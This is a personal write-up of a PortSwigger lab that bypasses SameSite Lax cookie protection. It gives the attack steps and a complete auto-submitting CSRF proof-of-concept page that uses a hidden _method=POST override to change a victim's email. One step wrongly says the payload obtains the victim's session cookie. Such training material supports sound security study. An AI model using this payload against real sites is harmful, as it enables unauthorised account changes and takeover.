# [SameSite Lax bypass via method override] — [PortSwigger] — [Practitioner]
**Date:** 2026-06-09
 
---
 
## Vulnerability / core concept
Cross-site Request Forgery

## What made me stuck
Method overriding in context of HTTP was a new concept for me.

## What unblocked me
I used AI to first gain idea about method overriding, which helped me to solve this lab.
 
---


## Attack path
1) First we need to log in to access email change functionality.
2) We can notice that there is no csrf token to prevent csrf attacks, the application solely relies on SameSite to prevent it.
3) As we can see in developer tools-> storage, this application has not set SameSite attribute. That means it is by default assigned to Lax. So if we can somehow exploit email change using GET request, we will be able to complete csrf attack.
4) As AI suggested there are several ways for method overriding: a custom header `X-HTTP-Method-Override` (does not help with this lab), and using `_method` that is used by several frameworks as a workaround for HTML forms that support only GET and POST.
5) All we need to do in this lab is to generate a csrf PoC, include extra hidden input `_method` and set its value to `POST`. `form` itself, however, will be using GET so payload can get victim's session cookie. We send this payload to victim, complete csrf attack and solve the lab.

---


## Payload / key command
```html
<!DOCTYPE html>
  <html>
  <head>
      <title>CSRF PoC</title>
  </head>
  <body>
      <h3>Standard CSRF PoC</h3>
      <form action="https://0a3800f703d8d70e8042036b008c0044.web-security-academy.net/my-account/change-email" method="get">
      <input type="hidden" name="email" value="victim@babek" />
  <input type="hidden" name="_method" value="POST">
          <input type="submit" value="Submit request" />
      </form>
      <script>
          history.pushState('', '', '/');
          document.forms[0].submit();
      </script>
  </body>
  </html>
```
As you can see, method of `form` is set to GET, however, we add extra input and override it by using `_method` with value POST.

---


## What I'd recognize faster next time
SameSite Lax does not entirely prevent csrf attacks. As you can see, some frameworks allow method overriding (especially legacy ones), which can help attacker to perform csrf attack.
 

